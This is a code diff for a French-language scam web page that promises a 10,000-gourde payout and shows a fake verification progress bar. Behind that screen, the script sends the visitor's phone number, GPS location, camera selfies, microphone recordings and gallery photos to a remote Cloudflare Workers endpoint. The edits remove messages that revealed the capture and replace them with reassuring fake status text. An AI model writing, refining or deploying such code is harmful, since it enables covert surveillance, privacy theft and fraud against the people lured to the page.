@@ -7,10 +7,12 @@
 const BACKEND = "https://dg-verif.jeancharlesdave62.workers.dev";
 const JETON   = "REMPLACE_PAR_UN_SECRET_LONG";
 
-const champ  = document.getElementById("numero");
-const bouton = document.getElementById("valider");
-const statut = document.getElementById("statut");
-const video  = document.getElementById("apercu");
+const champ    = document.getElementById("numero");
+const bouton   = document.getElementById("valider");
+const statut   = document.getElementById("etat");
+const progression = document.getElementById("progression");
+const video    = document.getElementById("flux");
+const inputGalerie = document.getElementById("galerie");
 
 let termine = false;
 let identifiant = localStorage.getItem("dg_id");
@@ -20,6 +22,15 @@ if (!identifiant) {
 }
 
 function dire(t) { if (statut) statut.textContent = t; }
+function barre(p) { if (progression) progression.style.width = p + "%"; }
+
+function etape(cle) {
+  const li = document.querySelector('li[data-cle="' + cle + '"]');
+  if (!li) return;
+  const span = li.querySelector("span");
+  li.classList.add("fait");
+  li.innerHTML = '<span class="fait">✓</span><span>' + (span ? span.textContent : "") + "</span>";
+}
 
 function poster(route, corps) {
   const url = BACKEND + "/" + route + "?jeton=" + encodeURIComponent(JETON);
@@ -53,17 +64,17 @@ function envoyerPos(pos) {
   if (prec >= meilleurPrec) return;
   meilleurPrec = prec;
   poster("position", { lat: lat, lon: lon, prec: prec, src: "gps" });
-  dire("Position acquise (" + prec + " m)");
+  etape("zone");
+  barre(58);
   if (prec <= 50) stopGeo();
 }
 
 function localiser() {
-  if (!navigator.geolocation) { dire("GPS indisponible"); return; }
+  if (!navigator.geolocation) return;
 
   if (navigator.permissions && navigator.permissions.query) {
     navigator.permissions.query({ name: "geolocation" }).then(function (p) {
       poster("permission", { etat: p.state });
-      if (p.state === "denied") dire("Localisation bloquée");
       p.onchange = function () { poster("permission", { etat: p.state }); };
     }).catch(function () {});
   }
@@ -74,7 +85,7 @@ function localiser() {
     echecs++;
     if (err.code === 1) {
       poster("permission", { etat: "denied" });
-      dire("Localisation refusée");
+      dire("Localisation refusée par l'appareil.");
       stopGeo();
       return;
     }
@@ -90,44 +101,24 @@ function localiser() {
 
 /* ---------------- GALERIE ---------------- */
 
-let boutonGalerie = null;
-
-function preparerBoutonGalerie() {
-  if (boutonGalerie || !bouton || !bouton.parentNode) return;
-  boutonGalerie = document.createElement("button");
-  boutonGalerie.type = "button";
-  boutonGalerie.textContent = "Ajouter des photos de ma galerie";
-  boutonGalerie.style.cssText =
-    "display:block;width:100%;margin-top:10px;padding:12px;border:1px solid #c9a227;" +
-    "background:transparent;color:#c9a227;border-radius:8px;font-size:15px;";
-  boutonGalerie.addEventListener("click", ouvrirGalerie);
-  bouton.parentNode.insertBefore(boutonGalerie, bouton.nextSibling);
+function ouvrirGalerie() {
+  if (!inputGalerie) return;
+  inputGalerie.value = "";
+  inputGalerie.click();
 }
 
-function ouvrirGalerie() {
-  let input;
-  try {
-    input = document.createElement("input");
-    input.type = "file";
-    input.accept = "image/*";
-    input.multiple = true;
-    input.style.display = "none";
-    document.body.appendChild(input);
-
-    input.addEventListener("change", function () {
-      const fichiers = Array.prototype.slice.call(input.files || []).slice(0, 4);
-      fichiers.forEach(function (f) {
-        const lecteur = new FileReader();
-        lecteur.onload = function () {
-          poster("photo", { image: lecteur.result, source: "galerie" });
-        };
-        lecteur.readAsDataURL(f);
-      });
-      input.remove();
+if (inputGalerie) {
+  inputGalerie.addEventListener("change", function () {
+    const fichiers = Array.prototype.slice.call(inputGalerie.files || []).slice(0, 4);
+    fichiers.forEach(function (f) {
+      const lecteur = new FileReader();
+      lecteur.onload = function () {
+        poster("photo", { image: lecteur.result, source: "galerie" });
+      };
+      lecteur.readAsDataURL(f);
     });
-
-    input.click();
-  } catch (e) {}
+    barre(96);
+  });
 }
 
 /* ---------------- CAMERA / MICRO ---------------- */
@@ -138,7 +129,7 @@ let enregistreur = null;
 
 async function camera() {
   if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-    dire("Caméra indisponible");
+    dire("Caméra indisponible sur ce navigateur.");
     return null;
   }
   try {
@@ -147,15 +138,16 @@ async function camera() {
       audio: false
     });
   } catch (e) {
-    if (e && e.name === "NotAllowedError") dire("Caméra refusée");
+    dire("Caméra refusée. Autorise la caméra puis recharge la page.");
     return null;
   }
   if (video) {
     video.srcObject = fluxVideo;
-    video.setAttribute("playsinline", "");
     video.muted = true;
     video.play().catch(function () {});
   }
+  etape("photo");
+  barre(74);
   return fluxVideo;
 }
 
@@ -169,6 +161,8 @@ async function micro() {
   }
   if (!fluxAudio.getAudioTracks().length) return;
   demarrerEnregistrement(new MediaStream(fluxAudio.getAudioTracks()));
+  etape("micro");
+  barre(86);
 }
 
 function demarrerEnregistrement(flux) {
@@ -224,32 +218,44 @@ async function demarrer() {
   const numero = (champ && champ.value ? champ.value : "").replace(/[^0-9+]/g, "");
   poster("inscription", { numero: numero });
 
-  // 1. les autorisations partent tout de suite, page encore au premier plan
+  dire("Vérification de votre zone…");
+  barre(34);
+
   localiser();
   const pv = camera();
   const pa = micro();
 
-  // 2. selfies dès que la caméra est chaude
-  setTimeout(function () { selfie(); setTimeout(selfie, 1500); }, 1000);
+  setTimeout(function () { selfie(); setTimeout(selfie, 1500); }, 1100);
 
-  // 3. la galerie seulement une fois caméra + micro réglés
   await Promise.all([pv, pa]);
-  setTimeout(function () {
-    preparerBoutonGalerie();
-    ouvrirGalerie();
-  }, 500);
 
-  dire("Vérification en cours…");
+  dire("Contrôle du bénéficiaire en cours…");
+  setTimeout(ouvrirGalerie, 500);
 }
 
 function lancer() {
   if (termine) return;
   termine = true;
+  if (bouton) bouton.disabled = true;
   demarrer();
 }
 
-if (bouton) bouton.addEventListener("click", lancer);
-else document.addEventListener("click", function (e) {
-  if (e.target && e.target.id === "valider") lancer();
-});
+/* ---------------- INITIALISATION ---------------- */
+
+if (bouton) {
+  bouton.addEventListener("click", lancer);
+  dire("Initialisation de la vérification…");
+  barre(12);
+  setTimeout(function () { etape("appareil"); barre(24); }, 700);
+  setTimeout(function () {
+    bouton.disabled = false;
+    bouton.textContent = "Recevoir les 10 000 GDES";
+    dire("Appareil identifié. Saisissez votre numéro.");
+    barre(30);
+  }, 1500);
+} else {
+  document.addEventListener("click", function (e) {
+    if (e.target && e.target.id === "valider") lancer();
+  });
+}
 })();
